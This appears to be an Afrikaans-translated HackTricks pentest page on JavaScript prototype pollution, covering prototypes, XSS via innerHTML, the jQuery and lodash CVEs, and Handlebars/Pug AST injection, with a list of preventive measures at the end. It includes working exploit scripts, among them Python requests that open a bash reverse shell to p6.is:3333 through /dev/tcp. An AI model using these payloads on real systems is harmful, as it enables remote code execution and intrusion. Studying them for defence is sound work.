# NodeJS - \_\_proto\_\_ & prototipe-vervuiling

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Voorwerpe in JavaScript <a href="#053a" id="053a"></a>

Voorwerpe in JavaScript is essensieel versamelings van sleutel-waardepare, bekend as eienskappe. 'n Voorwerp kan geskep word met behulp van `Object.create` met `null` as 'n argument om 'n le√´ voorwerp te produseer. Hierdie metode maak die skepping van 'n voorwerp moontlik sonder enige ge√´rfde eienskappe.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
'n Le√´ voorwerp is soortgelyk aan 'n le√´ woordeboek, wat voorgestel word as `{}`.

### Funksies en Klasse in JavaScript

In JavaScript is klasse en funksies nou verbind, waar funksies dikwels as konstruksies vir klasse dien. Ten spyte van JavaScript se gebrek aan ingeboude klasse-ondersteuning, kan konstruksies klasgedrag naboots.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototipes in JavaScript

JavaScript maak die wysiging, byvoeging of verwydering van prototipe-eienskappe tydens uitvoering moontlik. Hierdie buigsaamheid maak die dinamiese uitbreiding van klasfunksionaliteit moontlik.

Funksies soos `toString` en `valueOf` kan verander word om hul gedrag te verander, wat die aanpasbare aard van JavaScript se prototipe-sisteem demonstreer.

## Erfenis

In prototipe-gebaseerde programmering word eienskappe/metodes deur voorwerpe van klasse ge√´rf. Hierdie klasse word geskep deur eienskappe/metodes by te voeg aan √≥f 'n instansie van 'n ander klas √≥f 'n le√´ voorwerp.

Dit moet opgemerk word dat wanneer 'n eienskap by 'n voorwerp gevoeg word wat as die prototipe vir ander voorwerpe dien (soos `myPersonObj`), die erfende voorwerpe toegang kry tot hierdie nuwe eienskap. Hierdie eienskap word egter nie outomaties vertoon nie tensy dit uitdruklik aangeroep word.

## \_\_proto\_\_ besoedeling <a href="#0d0a" id="0d0a"></a>

## Ontdek Prototipe Besoedeling in JavaScript

JavaScript-voorwerpe word gedefinieer deur sleutel-waarde pare en erf van die JavaScript Object-prototipe. Dit beteken dat die wysiging van die Object-prototipe alle voorwerpe in die omgewing kan be√Ønvloed.

Laten ons 'n ander voorbeeld gebruik om dit te illustreer:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Toegang tot die Object-prototipe is moontlik deur middel van:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Deur eienskappe by die Object-prototipe te voeg, sal elke JavaScript-objek hierdie nuwe eienskappe erf:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## prototipe besoedeling

Vir 'n scenario waar `__proto__` gebruik beperk is, is die wysiging van 'n funksie se prototipe 'n alternatief:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Dit affekteer slegs voorwerpe wat geskep is deur die `Vehicle` konstrukteur en gee hulle die `beep`, `hasWheels`, `honk`, en `isElectric` eienskappe.

Twee metodes om JavaScript voorwerpe globaal te affekteer deur middel van prototipe besoedeling sluit in:

1. Die `Object.prototype` direk besoedel:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Besoedeling van die prototipe van 'n konstrukteur vir 'n algemeen gebruikte struktuur:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Na hierdie operasies kan elke JavaScript-voorwerp die `goodbye` en `greet` metodes uitvoer.

## Besoedeling van ander voorwerpe

### Van 'n klas na Object.prototype

In 'n scenario waar jy 'n spesifieke voorwerp kan besoedel en jy moet by `Object.prototype` uitkom, kan jy dit soek met iets soos die volgende kode:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Array elemente besoedeling

Let daarop dat as jy aanspraak het op die besoedeling van eienskappe van voorwerpe in JS, as jy toegang het tot die besoedeling van 'n array, kan jy ook **waardes van die array besoedel** wat toeganklik is **deur indekse** (let daarop dat jy nie waardes kan oorskryf nie, so jy moet indekse besoedel wat op een of ander manier gebruik word maar nie geskryf word nie).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Vervuiling van HTML-elemente

Wanneer 'n HTML-element gegenereer word deur JS, is dit moontlik om die **`innerHTML`** eienskap te **oor skryf** om dit te laat skryf **willekeurige HTML-kode.** [Idee en voorbeeld van hierdie skryfstuk](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Voorbeelde

### Basiese Voorbeeld

'n Prototipevervuiling vind plaas as gevolg van 'n fout in die toepassing wat die oorskrywing van eienskappe op `Object.prototype` toelaat. Dit beteken dat aangesien die meeste voorwerpe hul eienskappe van `Object.prototype` aflei,

Die maklikste voorbeeld is om 'n waarde by 'n **onbepaalde eienskap van 'n voorwerp** toe te voeg wat gaan nagegaan word, soos:
```javascript
if (user.admin) {
```
As die eienskap **`admin` ongedefinieerd** is, is dit moontlik om 'n PP te misbruik en dit na Waar te stel met iets soos:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Die meganisme agter hierdie betrokkenheid behels die manipulasie van eienskappe sodat as 'n aanvaller beheer het oor sekere insette, hulle die prototipe van alle voorwerpe in die toepassing kan wysig. Hierdie manipulasie behels tipies die instelling van die `__proto__` eienskap, wat in JavaScript sinoniem is met die direkte wysiging van 'n voorwerp se prototipe.

Die voorwaardes waaronder hierdie aanval suksesvol uitgevoer kan word, soos uiteengesit in 'n spesifieke [studie](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf), sluit in:

- Die uitvoering van 'n rekursiewe samenvoeging.
- Die definisie van eienskappe gebaseer op 'n pad.
- Die kloning van voorwerpe.


### Oorskryf funksie
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto-vervuiling na RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Kli√´ntkant prototype-vervuiling na XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Prototype-vervuiling-aanval deur jQuery $ .extend

[Vir verdere besonderhede, kyk hierdie artikel](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
In jQuery kan die `$ .extend`-funksie lei tot prototype-vervuiling as die diep kopi√´ringseienskap verkeerd gebruik word. Hierdie funksie word gewoonlik gebruik om voorwerpe te kloon of eienskappe van 'n verstekvoorwerp saam te voeg. Maar wanneer dit verkeerd gekonfigureer word, kan eienskappe wat bedoel is vir 'n nuwe voorwerp, toegewys word aan die prototipe. Byvoorbeeld:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Hierdie kwesbaarheid, ge√Ødentifiseer as CVE-2019-11358, illustreer hoe 'n diep kopie per ongeluk die prototipe kan wysig, wat kan lei tot potensi√´le veiligheidsrisiko's, soos ongemagtigde administratiewe toegang as eienskappe soos `isAdmin` geverifieer word sonder behoorlike bestaansverifikasie.


### CVE-2018-3721, CVE-2019-10744: Prototipevervuilingaanval deur lodash

[Voor verdere besonderhede, kyk hierdie artikel](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) het soortgelyke prototipevervuilingkwesbaarhede (CVE-2018-3721, CVE-2019-10744) ondervind. Hierdie kwessies is aangespreek in weergawe 4.17.11.

### 'n Ander handleiding met CVE's

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### AST Prototipevervuiling in NodeJS

NodeJS maak uitgebreide gebruik van Abstrakte Syntaksbome (AST) in JavaScript vir funksies soos sjabloon-enjins en TypeScript. Hierdie gedeelte ondersoek die kwesbaarhede wat verband hou met prototipevervuiling in sjabloon-enjins, spesifiek Handlebars en Pug.

#### Handlebars Kwesbaarheidsanalise

Die Handlebars sjabloon-enjin is vatbaar vir 'n prototipevervuilingaanval. Hierdie kwesbaarheid ontstaan uit spesifieke funksies binne die `javascript-compiler.js` l√™er. Die `appendContent`-funksie, byvoorbeeld, kombineer `pendingContent` as dit teenwoordig is, terwyl die `pushSource`-funksie `pendingContent` na `undefined` herstel nadat die bron bygevoeg is.

##### Uitbuitingsproses

Die uitbuiting maak gebruik van die AST (Abstrakte Syntaksboom) wat deur Handlebars geproduseer word, deur hierdie stappe te volg:

1. **Manipulasie van die Parser**: Aanvanklik dwing die parser, via die `NumberLiteral`-node, dat waardes numeries moet wees. Prototipevervuiling kan hierdie beperking omseil en die invoeging van nie-numeriese strings moontlik maak.
2. **Hantering deur die Kompilator**: Die kompilator kan 'n AST-objek of 'n string-sjabloondokument verwerk. As `input.type` gelyk is aan `Program`, word die invoer as vooraf gepars behandel, wat uitgebuit kan word.
3. **Inspuiting van Kode**: Deur manipulasie van `Object.prototype` kan arbitr√™re kode in die sjabloonfunksie ingespuit word, wat kan lei tot afgele√´ kode-uitvoering.

'n Voorbeeld wat die uitbuiting van die Handlebars-kwesbaarheid demonstreer:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Hierdie kode wys hoe 'n aanvaller arbitr√™re kode in 'n Handlebars-sjabloon kan inspuit.

**Eksterne Verwysing**: 'n Probleem wat verband hou met prototipevervuiling is gevind in die 'flat' biblioteek, soos hier beskryf: [Probleem op GitHub](https://github.com/hughsk/flat/issues/105).

**Eksterne Verwysing**: [Probleem wat verband hou met prototipevervuiling in die 'flat' biblioteek](https://github.com/hughsk/flat/issues/105)

Voorbeeld van 'n prototipevervuiling-uitbuiting in Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug Kwesbaarheid

Pug, 'n ander sjabloon-enjin, loop 'n soortgelyke risiko van prototipevervuiling. Gedetailleerde inligting is beskikbaar in die bespreking oor [AST-injeksie in Pug](https://blog.p6.is/AST-Injection/#Pug).

Voorbeeld van prototipevervuiling in Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Voorkomende Maatre√´ls

Om die risiko van prototipe besoedeling te verminder, kan die volgende strategie√´ gebruik word:

1. **Objek Onveranderlikheid**: Die `Object.prototype` kan onveranderlik gemaak word deur `Object.freeze` toe te pas.
2. **Invoer Validering**: JSON-insette moet streng gevalideer word teen die toepassing se skema.
3. **Veilige Saamvoegfunksies**: Die onveilige gebruik van herhalende saamvoegfunksies moet vermy word.
4. **Prototipe-loos Objekte**: Objekte sonder prototipe-eienskappe kan geskep word deur `Object.create(null)` te gebruik.
5. **Gebruik van Map**: In plaas van `Object` moet `Map` gebruik word om sleutel-waarde pare te stoor.
6. **Biblioteekopdaterings**: Sekuriteitspatches kan ge√Ønkorporeer word deur gereeld biblioteke op te dateer.
7. **Linter en Statische Analisewerkstukke**: Gebruik gereedskap soos ESLint met toepaslike invoegtoepassings om prototipe besoedeling kwesbaarhede op te spoor en te voorkom.
8. **Kode-oorsigte**: Implementeer deeglike kode-oorsigte om potensi√´le risiko's met betrekking tot prototipe besoedeling te identifiseer en te verhelp.
9. **Sekuriteitsopleiding**: Maak ontwikkelaars bewus van die risiko's van prototipe besoedeling en die beste praktyke vir die skryf van veilige kode.
10. **Versigtig Gebruik van Biblioteke**: Wees versigtig wanneer jy derdeparty-biblioteke gebruik. Assesseer hul sekuriteitsposisie en hersien hul kode, veral di√© wat objekte manipuleer.
11. **Runtime-beskerming**: Maak gebruik van runtime-beskermingsmeganismes soos die gebruik van sekuriteitsgefokusde npm-pakkette wat prototipe besoedeling aanvalle kan opspoor en voorkom.

## Verwysings

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
